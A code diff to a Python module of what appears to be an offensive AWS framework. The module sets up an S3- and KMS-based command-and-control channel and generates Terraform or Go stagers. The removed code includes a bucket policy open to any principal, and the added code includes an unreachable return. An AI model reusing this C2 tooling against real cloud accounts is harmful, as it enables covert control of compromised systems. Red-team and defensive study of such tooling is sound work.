@@ -3,13 +3,12 @@ import os
 import string
 import sys
 import random
+import time
 
 import boto3
 from mongoengine import DoesNotExist
 
 from core.database.models import S3C2Listener
-import core.module.stager.aws_s3_c2_terraform
-import core.module.stager.aws_s3_c2_golang
 import requests
 
 author = {
@@ -184,6 +183,8 @@ def exploit(profile, workspace):
             except Exception as e:
                 return {"error": "Error from module: {}".format(str(e))}, 500
 
+            import core.module.stager.aws_s3_c2_terraform
+            import core.module.stager.aws_s3_c2_golang
             if stager_type == "terraform":
                 core.module.stager.aws_s3_c2_terraform.variables = {
                     "SERVICE": {
@@ -233,14 +234,20 @@ def exploit(profile, workspace):
                         "description": "The architecture to execute the binary at."
                     }
                 }
+                time.sleep(10)
+                stagerData = core.module.stager.aws_s3_c2_golang.exploit(dbdata)
 
-                stagerData = core.module.stager.aws_s3_c2_golang.exploit(None)
-            print(stagerData)
             if "error" in stagerData:
                 return stagerData
             else:
                 return stagerData["ModuleName"]
-
+            return {
+                "ModuleName": {
+                    "ModuleName": "S3 Command and Control",
+                    "Status": "Successfully created",
+                    "Bucket": bucket
+                }
+            }
         else:
             return {
                 'error': f"Error from module: {status['Error']}"
@@ -329,6 +336,8 @@ def setupBucket(profile, bucketname, commandkey, outputkey, stageruser, kmskey, 
             )['KeyMetadata']['Arn']
         else:
             kmsprofile.put_key_policy(
+                KeyID=kmskey,
+                PolicyName="default",
                 Policy=json.dumps(
                 {
                     "Version": "2012-10-17",
@@ -443,7 +452,7 @@ def setupBucket(profile, bucketname, commandkey, outputkey, stageruser, kmskey, 
                 'Status': 'Enabled'
             }
         )
-        print(f"Key: {kmskey}")
+
         return {
             'Status': "Successfully Created",
             "KMSKey": kmskey
@@ -453,59 +462,3 @@ def setupBucket(profile, bucketname, commandkey, outputkey, stageruser, kmskey, 
             'Status': "Error Creating",
             'Error': str(e)
         }
-
-def thebucket():
-    bucketPolicy = """
-        {
-            "Version": "2012-10-17",
-            "Statement": [
-                {
-                    "Sid": "Statement1",
-                    "Effect": "Allow",
-                    "Principal": {
-                        "AWS": stageruser
-                    },
-                    "Action": "s3:GetObject",
-                    "Resource": f"arn:aws:s3:::{bucketname}/*/{commandkey}"
-                },
-                {
-                    "Sid": "Statement1",
-                    "Effect": "Allow",
-                    "Principal": {
-                        "AWS": serveruser
-                    },
-                    "Action": "s3:GetObject",
-                    "Resource": f"arn:aws:s3:::{bucketname}/*/{outputkey}"
-                },
-                {
-                    "Sid": "Statement1",
-                    "Effect": "Allow",
-                    "Principal": {
-                        "AWS": serveruser
-                    },
-                    "Action": "kms:Decrypt",
-                    "Resource": kmskey
-                },
-                {
-                    "Sid": "Statement1",
-                    "Effect": "Allow",
-                    "Principal": {
-                        "AWS": stageruser
-                    },
-                    "Action": "kms:Encrypt",
-                    "Resource": kmskey
-                },
-                {
-                    "Sid": "Statement2",
-                    "Effect": "Allow",
-                    "Principal": {
-                        "AWS": "*"
-                    },
-                    "Action": [
-                        "s3:PutObject"
-                    ],
-                    "Resource": f"arn:aws:s3:::{bucketname}/*/{outputkey}"
-                }
-            ]
-        }
-    """
